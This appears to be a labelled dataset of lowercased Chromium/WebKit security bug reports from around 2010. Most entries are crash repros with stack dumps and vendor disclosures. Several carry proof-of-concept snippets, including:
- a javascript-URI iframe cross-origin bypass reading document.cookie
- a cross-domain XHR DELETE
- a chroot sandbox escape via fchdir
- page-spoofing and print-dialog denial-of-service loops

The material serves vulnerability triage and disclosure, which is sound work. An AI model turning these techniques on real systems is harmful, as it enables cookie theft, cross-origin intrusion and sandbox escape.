cross origin bypass using iframe on javascript uri similare to 37383 testcase code iframe name test src iframe input type=button value test onclick window.open 09 javascri 09 pt alert document.cookie test	2
video inside foreignobject inside svg inside img crash data text/html charset=utf-8 img src davidbloom120/video3.svg you probably never expected to see a video inside an img did you crashes chrome 5.0.366.2 on linux and 4.1.249.1045 on windows xp	11
webcore fontfallbacklist determinepitch memory corruption 0b4c05aab686a31bc4954a5bd6bae27b unpack the webkit30.rar and got the 2.xhtml and frame.jsp copy frame.jsp and 2.xhtml files to tomcat webapp dir.use chrome to visit frame.jsp the crash will like this 128.17b4 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=017f01b0 ebx=04e8e0b0 ecx=01af03f0 edx=0012f1a4 esi=01af03f0 edi=01af9db8 eip=017f01c0 esp=0012eea4 ebp=0012f00c iopl=0 nv up ei ng nz ac pe cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010297 017f01c0 c0017f rol byte ptr ecx 7fh ds:0023:01af03f0=b0 1:019 kv childebp retaddr args to child warning frame ip not in any known module following frames may be wrong 0012eea0 023a1871 04e8e4bc 04e9ca98 022ce67c 0012eeac 022ce67c 01b16c34 00000001 023ff9e7 chrome_1f30000 webcore fontfallbacklist determinepitch fpo 1,1,1 conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\platform\graphics\fontfallbacklist.cpp 77 0012eeb8 023ff9e7 0012f0a0 0012f104 04e8e4bc chrome_1f30000 webcore font isfixedpitch fpo 0,0,1 conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\platform\graphics\font.cpp 160 0012f00c 023fe014 04e8e4bc 0012f048 0012f0f4 chrome_1f30000 webcore renderblock findnextlinebreak conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderblocklinelayout.cpp 1800 0012f1c8 0236823f 04e8e4bc 00000001 0012f1f4 chrome_1f30000 webcore renderblock layoutinlinechildren conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderblocklinelayout.cpp 960 0012f254 0236807a 00000001 0012f2e0 0236936a chrome_1f30000 webcore renderblock layoutblock conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderblock.cpp 734 0012f260 0236936a 0012f2c8 04e8e4bc 04e8df14 chrome_1f30000 webcore renderblock layout fpo 0,0,1 conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderblock.cpp 663	11
security synchronous preflight xhr allows arbitrary xsrf it s possible to specify http method using xhr across domains body script var xhttp=new xmlhttprequest xhttp.open delete false xhttp.send var xmldoc xhttp.responsexml alert xmldoc script body	7
zdi-can-765 css charset text transformation vulnerability reported upstream at zdi-can-765 apple webkit css charset text transformation remote code execution vulnerability abstract tippingpoint has identified a vulnerability affecting the following products apple safari vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of apple safari s webkit user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within webkit s support of character sets if the ibm1147 character set is applied to a particular element and that element has a text transformation applied to it the application will attempt to access an object that does n't exist in order to perform the transformation successful exploitation will lead to code execution under the context of the web-browser this issue occurs when webkit applies the ibm1147 character set to a forced linebreak represented by the br element if an uppercase or lowercase text transformation is applied to the linebreak utilizing the ibm1147 character set the application will attempt to manipulate the text style accessing memory that has n't be accounted for this can be reproduced with the following code html xmlns style type text/css charset ibm1147 style br style type text/css br text-transform lowercase style br html version s tested apple safari 4.0.4 531.21.10 platform s tested windows xp sp3 credit this vulnerability was discovered by wushi of team509 further details if you have any questions comm ents concerns or require additional details please feel free to contact me via the following kate fly security liaison tippingpoint kfly tippingpoint.com office 1 512.681.8219 we can alternatively be reached via e-mail at zdi-disclosures tippingpoint.com our pgp key is available from information about the zdi established by tippingpoint the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used tippingpoint does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor tippingpoint provides its customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available furthermore with the altruistic aim of helping to secure a broader user base tippingpoint provides this vulnerability information confidentially to security vendors including competitors who have a vulnerability protection or mitigation product please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at	9
geolocation events fire after document deletion i stumbled on this when trying to land a fix for bug 39985 it s filed upstream as reporting here so i remember to merge it on friday	7
need to merge webcore toalphabetic crash to 375 branch	7
bad cast with svg g element version chrome version 6.0.472.55 stable operating system win 7 and xp reproduction case just open the xhtml file type of crash tab crash state 1 eax=02baccc0 ebx=00d41200 ecx=00d413a8 edx=00d414bc esi=00d413a8 edi=00d413a8 eip=56537265 esp=0012f5d4 ebp=0012f5fc iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 56537265 childebp retaddr warning frame ip not in any known module following frames may be wrong 0012f5d0 02236ef5 0012f5fc 022370d0 chrome_1c30000 hunspell_create_key 0012f624 02238180 chrome_1c30000 hunspell_create_key 0012f7f0 0215b9bc chrome_1c30000 hunspell_create_key 2 eax=0012eddc ebx=00d43a48 ecx=0121abd8 edx=80000010 esi=0012eddc edi=121abd80 eip=02161bd1 esp=0012ed90 ebp=0012ee3c iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202 chrome_1c30000 hunspell_create_key 02161bd1 a5 movs dword ptr es edi dword ptr esi es:0023:121abd80 ds:0023:0012eddc=a0d07798 childebp retaddr warning stack unwind information not available following frames may be wrong 0012ee3c 0215baad chrome_1c30000 hunspell_create_key 0012eec4 020d32d9 chrome_1c30000 hunspell_create_key 0012ef00 0215b7ba chrome_1c30000 hunspell_create_key	7
use after free in document.close forwarded message from microsoft vulnerability research msvr-at-microsoft.com trax-proxy-disabled+672461097.1147046125 trakken.google.com date mon jul 26 2010 at 11:34 am subject m 672461097 vulnerability report msvr-10-0103 to google security team security google.com the following software vulnerability report is highly confidential and should be limited in distribution to members of the engineering team within google with need-to-know for performance of security risk analysis and remediation we ask you to please direct all communications through msvr microsoft.com for business and legal continuity purposes and not to the individual finder or other contacts you may have at microsoft corporation hi google security team we have found an exploitable use-after-free object lifetime bug in the latest version of chrome we do not have the complete details but it appears from the disassembly that there is an attempt to reset a htmltoken object after it has been deleted i have attached a repro that should help with root cause analysis for msvr internal tracking i have assigned this issue msvr-10-0103 test repro environment windows 7 rtm x86 chrome 5.0.375.99 app verifier/page heap 8ec.ddc access violation code c0000005 second chance eax=00000000 ebx=05175000 ecx=0513b1e0 edx=00000000 esi=002ef244 edi=05175020 eip=5fb33fc0 esp=002ef22c ebp=002ef248 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 chrome_5f9a0000 webcore token reset 5fb33fc0 8b07 mov eax dword ptr edi ds:0023:05175020 1:018 u 5fb33fc0 8b07 mov eax dword ptr edi 5fb33fc2 832700 and dword ptr edi 0 dword size write 5fb33fc5 56 push esi 5fb33fc6 85c0 test eax eax 5fb33fc8 7408 je chrome_5f9a0000 webcore token reset 5fb33fd2 5fb33fca 83c004 add eax,4 5fb33fcd e8a0e9ecff call chrome_5f9a0000 wtf refcounted webcore clipboard deref 5fa02972 5fb33fd2 8d7704 lea esi edi+4 1:018 dv this 1:018 dt this local var edi type webcore token attrs wtf refptr webcore namedmappedattrmap text wtf refptr webcore stringimpl tagname webcore atomicstring begintag selfclosingtag brokenxmlstyle m_sourceinfo wtf ownptr wtf vector wchar_t,0 memory read error 0517502e 1:018 k childebp retaddr 002ef228 5fb37f30 chrome_5f9a0000 webcore token reset c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\htmltokenizer.h 73 002ef248 5fb370ab chrome_5f9a0000 webcore htmltokenizer processtoken c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\htmltokenizer.cpp 1944 002ef370 5fb378bb chrome_5f9a0000 webcore htmltokenizer parsetag c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\htmltokenizer.cpp 1513 002ef410 5f9dc836 chrome_5f9a0000 webcore htmltokenizer write c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\htmltokenizer.cpp 1765 002ef470 5f9dc910 chrome_5f9a0000 webcore frameloader write c b\slave\chrome-official\build\src\third_party\webkit\webcore\loader\frameloader.cpp 945 002ef494 5f9dc8dd chrome_5f9a0000 webcore frameloader endifnotloadingmainresource c b\slave\chrome-official\build\src\third_party\webkit\webcore\loader\frameloader.cpp 981 002ef4c8 5fb7038f chrome_5f9a0000 webcore frameloader end c b\slave\chrome-official\build\src\third_party\webkit\webcore\loader\frameloader.cpp 967 002ef4cc 5fbf64c5 chrome_5f9a0000 webcore resourceloader didfinishloading c b\slave\chrome-official\build\src\third_party\webkit\webcore\loader\resourceloader.cpp 444 002ef4d4 6002c5ae chrome_5f9a0000 webcore resourcehandleinternal didfinishloading c b\slave\chrome-official\build\src\third_party\webkit\webkit\chromium\src\resourcehandle.cpp 149 002ef4e8 6e13fdf9 chrome_5f9a0000 webkit_glue weburlloaderimpl context oncompletedrequest c b\slave\chrome-official\build\src\webkit\glue\weburlloader_impl.cc 560 warning stack unwind information not available following frames may be wrong 002ef624 5ffdca06 verifier verifiergetproviderhelper 002ef630 5ffdc380 chrome_5f9a0000 resourcedispatcher dispatchmessagew c b\slave\chrome-official\build\src\chrome\common\resource_dispatcher.cc 533 00000000 00000000 chrome_5f9a0000 resourcedispatcher onmessagereceived c b\slave\chrome-official\build\src\chrome\common\resource_dispatcher.cc 303 18 lmv m chrome_5f9a0000 start end module name 5f9a0000 60b6d000 chrome_5f9a0000 private pdb symbols c debuggers\sym\chrome_dll.pdb\91dcc128f9794e409d1bff5780a03f4d1\chrome_dll.pdb loaded symbol image file c users appdata\local\google\chrome\application\5.0.375.99\chrome.dll image path c users appdata\local\google\chrome\application\5.0.375.99\chrome.dll image name chrome.dll timestamp mon jun 28 17:51:03 2010 4c294377 checksum 01121656 imagesize 011cd000 file version 5.0.375.99 product version 5.0.375.99 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_dll originalfilename chrome.dll productversion 5.0.375.99 fileversion 5.0.375.99 filedescription google chrome	7
use after free with svg use referencing svg style element with chrome it sees always comes to 00000000 but chromium not it does not crash safari chromium 6.0.477.0 53603 chrome 5.0.375.125 1.svg xml version 1.0 standalone no svg width 100 height 100 version 1.1 xmlns xmlns xlink style id crash ff style use xlink href crash k svg	7
use after free with nested use elements 1.svg xml version 1.0 standalone no svg width 100 height 100 version 1.1 xmlns xmlns xlink a id crash pattern xlink href crash pattern a use xlink href crash use a svg test chromium 6.0.485.0 54871 only chrome and safari does not crash	7
unescape according to the safe browsing spec we do n't currently unescape according to the safe browsing spec it s my understanding that we use the content of a gurl directly safe browsing specifies that more stuff should be unescaped i think this means we re missing malicious urls with escaped characters in them	9
security terminate busy loops on page transitions moving here from internal bug 802115 we should prevent this from succeeding for obvious reasons snip html body onunload='intercept script function intercept document.getelementbyid hideme style.visibility hidden document.getelementbyid showme style.visibility visible alert still executing while 1 script span id=showme style visibility hidden font size=+1 color=teal spoofed page font span br span id=hideme please navigate away from this page span snip	11
security safebrowsingservice pure virtual function call and memory corruption pure virtual function call details id safebrowsingservice onblockingpagedone r6025 debugbreak d6c6e6b6429cb8f7d16625091f70beac description pure virtual function call in safebrowsingservice onblockingpagedone relevant stack chrome_67b80000 anonymous namespace invalidparameter wchar_t expression wchar_t function wchar_t file unsigned int line unsigned int reserved 0 c b\slave\chromium-rel-xp\build\src\chrome\app\chrome_dll_main.cc 136 chrome_67b80000 purecall void f dd\vctools\crt_bld\self_x86\crt\src\purevirt.c 54 chrome_67b80000 safebrowsingservice onblockingpagedone class std vector safebrowsingservice unsaferesource std allocator safebrowsingservice unsaferesource resources bool proceed false c b\slave\chromium-rel-xp\build\src\chrome\browser\safe_browsing\safe_browsing_service.cc 238 memory corruption details id safebrowsingservice onblockingpagedone readav arbitrary d6c6e6b6429cb8f7d16625091f70beac description attempt to read from arbitrary memory in safebrowsingservice onblockingpagedone relevant stack chrome_67b80000 safebrowsingservice onblockingpagedone class std vector safebrowsingservice unsaferesource std allocator safebrowsingservice unsaferesource resources bool proceed false c b\slave\chromium-rel-xp\build\src\chrome\browser\safe_browsing\safe_browsing_service.cc 236 chrome_67b80000 runnablemethod safebrowsingservice void void c b\slave\chromium-rel-xp\build\src\base\task.h 289 repro steps 1 try to open a website that has been marked as hosting malware and no longer exists eg 2 you see an interstitial click the checkbox and proceed anyway 3 chrome is trying to connect which takes a long time because the site is offline 4 while chrome is still trying to connect refresh the page optionally go through steps 2-4 again if the crash does n't happen immediately marking as security because of the memory corruption severity initially set to medium because this requires unlikely user interaction to exploit	11
plugins are not always blocked by content settings plugins are not always blocked by content settings observed in 5.0.365.0 developer build 42941 repro steps 1 modify content settings to block all plugins 2 load test case 3 click button 4 notice that the plugin loads and can be played the bug is likely related to the fact that we only send down the blocked content settings in response to a top-level navigation in this example there is no top-level navigation since the newly opened window is to about blank	2
drag and drop bad reference counting leads to re-use of freed memory webcore string length readav arbitrary 394bb1a56acd66a43221b2a08fa5b25a dragging and dropping an image while a page is being refreshed can trigger memory corruption found while trying to reproduce issue 41447 repro 1 create a window with an iframe that refreshes constantly drag drop.htm 2 in the iframe load a page that has an image drag drop2.html drag drop.jpg 3 drag and drop the image 4 kab00m this repro may not show clear signs of memory corruption however using the repro for issue 41447 to do this does clearly show the same crash but with a non-null pointer	11
security a malicious page may gain access to context of an extension s content script if an extension causes dom event to be fired e.g by modifying dom tree which is rather common or explicitly calling dispatchevent the event listener installed by the main page will be erroneously called in extension s context while actual handler code will be executed in context associated with the js function hence in page s world js wrappers for dom objects will be retrieved from extension s world this allows a malicious page to mess with extension s object.prototype by following prototype chain of any dom object e.g by installing property getters/setters there data sent to/from background page may sometimes be intercepted and extension s logic altered note that the extent appears to be limited to dom object prototypes the page handler still runs in page s world and whatever code it may trick extension to execute by modifying prototypes will still be running in page s context please find an exploit attached including both sample victim extension and a malicious page install the extension then load maliciouspage.html a content of global variable assigned to in the extension is displayed by the page	11
security focus selective keystroke redirection i filed a bug with webkit as i believe the problem is on their end but we should probably keep track of it and make sure we integrate any fixes they may have upstream bug poc works against chrome on win32	7
cross-origin bypass javascript url can be set in iframe.src via numerous dom aliases via node and namednodemap originally submitted by serg.glazunov unfortunately there s another way to bypass the check javascript i document.createelement iframe i.src attr document.createattribute src attr.nodevalue javascript alert document.body.innerhtml i.onload function i.onload null i.attributes.setnameditem attr document.body.appendchild i tested on r43185	5
table layout crash bug from wushi reproduces for me with attached repro analysis webkit/webcore/rendering/fixedtablelayout.cpp int usedspan 0 int i 0 while usedspan span assert ccol i neffcols int espan m_table spanofeffcol ccol i only set if no col element has already set it if m_width ccol i isauto w.type auto m_width ccol i setrawvalue w.type w.rawvalue espan span usedwidth effwidth espan span usedspan espan i the repro causes i to go large and out-of-bounds a debug build will crash on the assert that i commented out an optimized build will typically crash due to an out-of-bounds array read due to the large i value note that isauto and setrawvalue are non-virtual otherwise this would be clearly exploitable due to using an out-of-bounds vtable setrawvalue is under some conditions writing out-of-bounds to an array so this is still likely exploitable assigning secseverity-high out of an abundance of caution	7
md audit linux sandbox escape mark dowd noted that there s a sandbox escape on the linux build and likely all os_posix systems it is caused by the interaction of the renderer message viewhostmsg_databaseopenfile and chroot based sandboxing in os_posix based systems the browser sends a directory file descriptor over the browser renderer ipc channel unfortunately this enables easy escaping of the sandbox via fchdir dir_fd chdir i confirmed the escape by editing chrome/common/database_util.cc to include this modified chunk elif defined os_posix if dir_handle int fd dir_handle_rv.fd fchdir fd for int i 0 i 100 i chdir chdir tmp creat chrome.0wned 0600 dir_handle dir_handle_rv.fd and then when accessing an html5 web db e.g app.appspot.com/static/webdb.html then type select from pants there is indeed a tmp/chrome.0wned file created i was careful to make sure i ran with the sandbox i set export chrome_devel_sandbox=/opt/google/chrome/chrome-sandbox and used proc to verify the root of the renderer process was in a chroot	9
md audit possible memory corruption with bad bitmap shared memory object in clipboard ipc 1 command buffer service integer overflow file app/clipboard/clipboard.cc function clipboard dispatchobject problem type type confusion compromise type varies severity high message viewhostmsg_clipboardwriteobjectsasync the dispatchobject function reads a series of clipboard objects from the untrusted renderer process and stores them in the clipboard object in the browser process one particular object type cbf_smbitmap contains a vector char input parameter whose contents are simply interpreted as a pointer to a sharedmemory object ie the character buffer s contents are really a pointer not a byte stream normally this would be a dangerous operation as an arbitrary pointer supplied by the untrusted renderer process could be misinterpreted leading to potential illegal memory accesses and so forth however the renderer ordinarily does n't supply this pointer directly instead that parameter is replaced on the browser side in clipboard replacesharedmemhandle with a pointer to an object created within the browser process however clipboardreplacesharedmemhandle is only called when processing the viewhostmsg_clipboardwriteobjectssync message not when processing viewhostmsg_clipboardwriteobjectsasync messages therefore if cbf_smbitmap objects are included in a viewhostmsg_clipboardwriteobjectsasync message no replacement is done on the input parameters hence allowing the renderer to supply an arbitrary sharedmemoryhandle pointer this can potentially lead to illegal memory accesses and arbitrary execution	9
md audit stale pointer error when normalizing dom nodes webkit bug copy of details follows for convenience repro being attached for convenience 3 webkit normalize use-after-free vulnerability file third_party/webkit/webcore/dom/element.cpp function element normalizeattributes problem type memory corruption compromise type remote compromise severity high the normalize method may be called on dom elements to merge adjacent text nodes within the element s heirarchy this includes merging child text nodes as well as attribute text modes attributes are handled by the element normalizeattributes function which inspects each attribute node of a given element and if it contains child text nodes they will be merged internally an element holds attributes within a vector m_attributes when element normalizeattributes is called the length of this vector is determined and then a loop is entered where attributes are accessed one at a time and normalized however the normalization process can cause text nodes to be modified or deleted resulting in dom mutation events being fired if handlers for these events are installed that remove the attributes from the element being normalized then normalizeattributes will access m_attribute elements past the end of the vector removing elements from m_attributes does not actually cause it to be relocated in memory so accessing elements past the end of the vector will result in utilzing stale pointers of the removed attribute nodes these stale pointers are passed to normalize and will potentially be written to resulting in memory corruption and arbitrary execution	7
innerhtml decompilation issues in textarea chrome and safari ergo webkit have a problem when they decompile innerhtml this can be abused to create xss attacks when you read node.innerhtml of a textarea the chars inside are not encoded properly poc put this textarea lt textarea gt lt script gt alert 1 lt script gt textarea here greetings	7
need to merge fix for webkit font issue to 375 branch use-after-free hence secseverity-high fixed in	7
security webkit webcore webglunsignedintarrayinternal getcallback readav arbitrary deef89ee3d0345edebeaf13cf974c47c repro new webglunsignedintarray 0 8 get problem get method does not check sanity of argument id webcore webglunsignedintarrayinternal getcallback readav arbitrary deef89ee3d0345edebeaf13cf974c47c description security attempt to read from arbitrary memory in webcore webglunsignedintarrayinternal getcallback stack webcore webglunsignedintarrayinternal getcallback v8 internal handleapicallhelper v8 internal builtin_handleapicall v8 internal invoke v8 internal execution call v8 script run webcore v8proxy runscript webcore v8proxy evaluate webcore scriptcontroller evaluate webcore scriptcontroller executescript webcore htmltokenizer scriptexecution webcore htmltokenizer scripthandler webcore htmltokenizer parsenonhtmltext webcore htmltokenizer parsetag webcore htmltokenizer write webcore frameloader write webcore frameloader endifnotloadingmainresource webcore frameloader finishedloading webcore mainresourceloader didfinishloading webcore resourceloader didfinishloading webkit_glue weburlloaderimpl context oncompletedrequest resourcedispatcher onrequestcomplete ipc messagewithtuple resourcedispatcher dispatchmessagew resourcedispatcher onmessagereceived childthread onmessagereceived runnablemethod run messageloop runtask messageloop dowork base messagepumpdefault run messageloop runinternal messageloop run renderermain	11
sessionstorage is shared on iframe sandbox this is allowed on iframe sandbox frames when they are same origin x=top.sessionstorage.x top.sessionstorage.x='content and it should n't	2
sandboxed iframes should not autocomplete/autofill unless allow-same-origin set after abarth s suggestion i checked the passwd db on sandboxed iframes and they leak even if they are supposed to be different origin step 1 visit html_xss 3cform 20action 20method=post 3e 3cinput 20type=text 20name=lol 3e 3cinput 20type=password 20name=pox 3e 3c/form 3e step 2 put hello as username and world as password and press enter step 3 click on remember this password step 4 visit html_xss 3cform 20action 20method=post 3e 3cinput 20type=text 20name=lol 3e 3cinput 20type=password 20name=pox 3e 3c/form 3e step 4 will contain the user s username and password but since it s supposed to be another origin it shouldnt	2
zdi-can-766 svg foreignobject rendering layout vulnerability reported upstream as zdi-can-766 apple s webkit svg foreignobject rendering layout remote code execution vulnerability abstract tippingpoint has identified a vulnerability affecting the following products apple safari vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of apple safari s webkit user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within webkit s layout implementation of an particular tag used for embedding a foreign document into the svg namespace later when the application attempts to calculate layout information for rendering the contents of the tag the application will attempt to access a linebox that was previously destroyed successful exploitation can lead to code execution under the context of the application the issue occurs when utilizing elements from the svg namespace upon parsing a foreignobject element containing an svg group containing a text element the application will attempt to create a linebox on layout for the container upon layoutting the application will attempt to access a linebox that does n't exist this can be reproduced with the following code svg xmlns foreignobject g text crash text g foreignobject svg version s tested apple safari 4.0.4 531.21.10 platform s tested windows xp sp3 credit this vulnerability was discovered by wushi of team509 further details if you have any questions comments concerns or require additional details please feel free to contact me via the following kate fly security liaison tippingpoint kfly tippingpoint.com office 1 512.681.8219 we can alternatively be reached via e-mail at zdi-disclosures tippingpoint.com our pgp key is available from information about the zdi established by tippingpoint the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used tippingpoint does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor tippingpoint provides its customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available furthermore with the altruistic aim of helping to secure a broader user base tippingpoint provides this vulnerability information confidentially to security vendors including competitors who have a vulnerability protection or mitigation product please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at	11
security chrome_1c30000 webcore inlinebox paint test it on 4.1.249.1064 45376 the stack is like this childebp retaddr args to child 0012edfc 023bbc32 0012ee30 00000000 000000a9 chrome_1f30000 webcore inlinebox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlinebox.cpp 173 0012ee5c 023bbc32 0012ee90 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012eebc 023bbc32 0012eef0 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012ef1c 023bbc32 0012ef50 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012ef7c 023bbc32 0012efb0 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012efdc 023bbc32 0012f010 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012f03c 023bbc32 0012f070 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012f09c 023bbc32 0012f0d0 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012f0fc 023bbc32 0012f130 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012f15c 023bbc32 0012f190 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012f1bc 023b9d13 0012f248 00000000 000000a9 chrome_1f30000 webcore inlineflowbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\inlineflowbox.cpp 674 0012f1d4 023e2987 0012f248 00000000 000000a9 chrome_1f30000 webcore rootinlinebox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rootinlinebox.cpp 166 001 unpack the webkit21.rar and got the 1.xhtml and frame.jsp copy frame.jsp and 1.xhtml files to tomcat webapp dir.use safari to visit frame.jsp chrome will crash and sometimes maybe you need move mouse in the window i used a 12 inch laptop windows xp sp3 version	11
crash with invalid images chrome-version 5.0.375.55 os windows xp sp3 poc attached steps to reproduce 1 open file test.html 2 second button copy image 3 crash info excepcion de aplicacion ocurrida aplicacion c documents and settings\jose\configuracion local\datos de programa\google\chrome\application\chrome.exe pid=1812 fecha y hora 27/05/2010 a las 00:22:47.828 numero de excepcion c0000005 infraccion de acceso estado para identificador de subproceso eax=0012f5c8 ebx=0012f5c8 ecx=0000000a edx=017ee000 esi=00000000 edi=0012f5c8 eip=01efe191 esp=0012f550 ebp=0012f5f4 iopl=0 nv up ei pl zr na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 defaulted to export symbols for c documents and settings\jose\configuracion local\datos de programa\google\chrome\application\5.0.375.55\chrome.dll funcion chrome hunspell_create_key 01efe17b 56 push esi 01efe17c 8b742410 mov esi esp 01efe180 57 push edi 01efe181 3bde cmp ebx esi 01efe183 745a jz chrome hunspell_create_key 01efe1df 01efe185 8bc3 mov eax ebx 01efe187 e894030000 call chrome hunspell_create_key 01efe520 01efe18c 6a0a push 01efe18e 59 pop ecx 01efe18f 8bfb mov edi ebx error 01efe191 f3a5 rep movsd ds:00000000 es:0012f5c8=00000000 01efe193 8b742414 mov esi esp 01efe197 8b4604 mov eax esi 01efe19a 8b3d2c746d02 mov edi chrome 026d742c 01efe1a0 85c0 test eax eax 01efe1a2 7406 jz chrome hunspell_create_key 01efe1aa 01efe1a4 83c004 add eax 01efe1a7 50 push eax 01efe1a8 ffd7 call edi 01efe1aa 8b36 mov esi esi 01efe1ac 85f6 test esi esi seguimiento regresivo de pila 0012f5f4 01de5724 00000000 0012f678 0012f72c chrome hunspell_create_key 0012f718 01cf9c7c 02ecabd0 0012f72c 0177d000 chrome hunspell_create_key 0012f7d0 01e9399d 00000000 02e79250 01794400 chrome chromemain 0012f864 01fea0f4 0012f870 00000047 00000059 chrome hunspell_create_key 0012f878 01fe8bcf 00000047 00000059 01777004 chrome hunspell_create_key 0012f960 0226b069 02e79250 017403e8 0226b043 chrome hunspell_create_key 0012f994 020ae846 02e79250 00000000 01fc3e2e chrome hunspell_create_key 0012f9e8 01fd3c88 01777000 0012fb08 00000000 chrome hunspell_create_key 0012fa14 01fc3cd9 0012fb08 01777004 01fc3c5e chrome hunspell_create_key 0012fa48 01fddc4d 02979114 0012fe10 00000000 chrome hunspell_create_key 0012fcb0 01c33bac 00000007 003e5d88 01c33544 chrome hunspell_create_key 0012fe6c 00403439 00400000 0012ff28 000207c0 chrome chromemain 0012fed0 00403aa2 00400000 0012ff28 fffffffe chrome 0012ff30 00445e3d 00400000 00000000 00020898 chrome 0012ffc0 7c817067 7c80e534 00000000 7ffda000 chrome 0012fff0 00000000 00445ea8 00000000 78746341 kernel32 registerwaitforinputidle	9
dos by opening unlimited number of print dialogs a malicious webpage can freeze all of chromium and possibly all of the operating system replication while true print	11
memory corruption in first-letter rendering another interesting bug from wushi affects chrome 5.0.375.70 inside debugger hits assert obj isrenderinline obj this d chrome\375\src\third_party\webkit\webcore\rendering\renderblocklinelayout.cpp which is similar to some other bugs i have seen resulting in memory corruption does not affect chrome 6 trunk need to hunt down the recent fixes and then probably merge to branch the fix happened between safari nightly r59670 r59189	11
browser crash after appmodaldialogqueue shownextdialog chromium crashes when several pages simultaneously open a dialog window with javascript alert to reproduce echo a.html echo script alert click script b.html chromium-browser g html html html html html html this happens at least in x86 ubuntu 10.04 with chromium 6.0.438.0 developer build 49884 ubuntu and google chrome 5.0.375.70 official build 48679 adding more files increases the reproducibility i have not yet tested whether this happens in other platforms or can be triggered with less files there is a message about failed gtk assertion before the segfault so this is probably a linux-specific issue backtrace from chromium-browser g 10374:10374:2812236104 error chrome/app/chrome_dll_main.cc 247 gtk gtk_widget_destroy assertion gtk_is_widget widget failed program received signal sigsegv segmentation fault in gdb bt 0 in 1 in appmodaldialogqueue shownextdialog this at chrome/browser/app_modal_dialog_queue.cc:18 2 in appmodaldialog completedialog this at chrome/browser/app_modal_dialog.cc:44 3 in javascriptappmodaldialog onaccept this prompt_text suppress_js_messages=false at chrome/browser/js_modal_dialog.cc:106 4 in javascriptappmodaldialog handledialogresponse this dialog response_id=-5 at chrome/browser/js_modal_dialog_gtk.cc:61 5 in g_cclosure_marshal_void int0_t from usr/lib/libgobject-2.0.so.0 6 in g_closure_invoke from usr/lib/libgobject-2.0.so.0 7 in from usr/lib/libgobject-2.0.so.0 8 in g_signal_emit_valist from usr/lib/libgobject-2.0.so.0 9 in g_signal_emit from usr/lib/libgobject-2.0.so.0 10 in gtk_dialog_response from usr/lib/libgtk-x11-2.0.so.0 11 in g_cclosure_marshal_void__void from usr/lib/libgobject-2.0.so.0 12 in g_closure_invoke from usr/lib/libgobject-2.0.so.0 13 in from usr/lib/libgobject-2.0.so.0 14 in g_signal_emit_valist from usr/lib/libgobject-2.0.so.0	11
